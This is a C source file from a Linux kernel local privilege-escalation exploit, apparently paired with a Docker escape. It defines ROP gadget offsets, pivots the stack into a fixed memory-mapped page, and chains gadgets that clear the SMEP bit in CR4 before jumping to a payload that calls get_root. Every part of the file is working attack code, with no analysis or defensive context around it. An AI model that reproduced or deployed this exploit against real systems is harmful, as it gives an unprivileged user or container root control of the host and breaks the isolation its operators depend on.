#include "./kernel_infos.h"
#include "./docker_escape.h"

// Used when ENABLE_SMEP_BYPASS is used.
// - xchg eax, esp ; ret
// - pop rdi ; ret
// - mov dword ptr [rdi], eax ; ret
// - push rbp ; mov rbp, rsp ; mov rax, cr4 ; pop rbp ; ret
// - neg rax ; ret
// - pop rcx ; ret 
// - or rax, rcx ; ret
// - xchg eax, edi ; ret
// - push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
// - jmp rcx
extern unsigned long kernel_base;
extern void get_root(void);
#define XCHG_EAX_ESP_RET		(kernel_base + kernels[kernel].xchg_eax_esp_ret)
#define POP_RDI_RET			(kernel_base + kernels[kernel].pop_rdi_ret)
#define MOV_DWORD_PTR_RDI_EAX_RET	(kernel_base + kernels[kernel].mov_dword_ptr_rdi_eax_ret)
#define MOV_RAX_CR4_RET			(kernel_base + kernels[kernel].mov_rax_cr4_ret)
#define NEG_RAX_RET			(kernel_base + kernels[kernel].neg_rax_ret)
#define POP_RCX_RET			(kernel_base + kernels[kernel].pop_rcx_ret)
#define OR_RAX_RCX_RET			(kernel_base + kernels[kernel].or_rax_rcx_ret)
#define XCHG_EAX_EDI_RET		(kernel_base + kernels[kernel].xchg_eax_edi_ret)
#define MOV_CR4_RDI_RET			(kernel_base + kernels[kernel].mov_cr4_rdi_ret)
#define JMP_RCX				(kernel_base + kernels[kernel].jmp_rcx)

// * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *

uint64_t saved_esp;

// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
	asm volatile ("					\n\
	payload:					\n\
		movq %%rbp, %%rax			\n\
		movq $0xffffffff00000000, %%rdx		\n\
		andq %%rdx, %%rax			\n\
		movq %0, %%rdx				\n\
		addq %%rdx, %%rax			\n\
		movq %%rax, %%rsp			\n\
		call get_root				\n\
		ret					\n\
	" : : "m"(saved_esp) : );
}

void payload();

#define CHAIN_SAVE_ESP				\
	*stack++ = POP_RDI_RET;			\
	*stack++ = (uint64_t)&saved_esp;	\
	*stack++ = MOV_DWORD_PTR_RDI_EAX_RET;

#define SMEP_MASK 0x100000

#define CHAIN_DISABLE_SMEP			\
	*stack++ = MOV_RAX_CR4_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = POP_RCX_RET;			\
	*stack++ = SMEP_MASK;			\
	*stack++ = OR_RAX_RCX_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = XCHG_EAX_EDI_RET;		\
	*stack++ = MOV_CR4_RDI_RET;

#define CHAIN_JMP_PAYLOAD                     \
	*stack++ = POP_RCX_RET;               \
	*stack++ = (uint64_t)&payload;        \
	*stack++ = JMP_RCX;

void mmap_stack() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = XCHG_EAX_ESP_RET % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}

	stack = (uint64_t*)((char*)stack_aligned + stack_offset);

	CHAIN_SAVE_ESP;
	CHAIN_DISABLE_SMEP;
	CHAIN_JMP_PAYLOAD;
}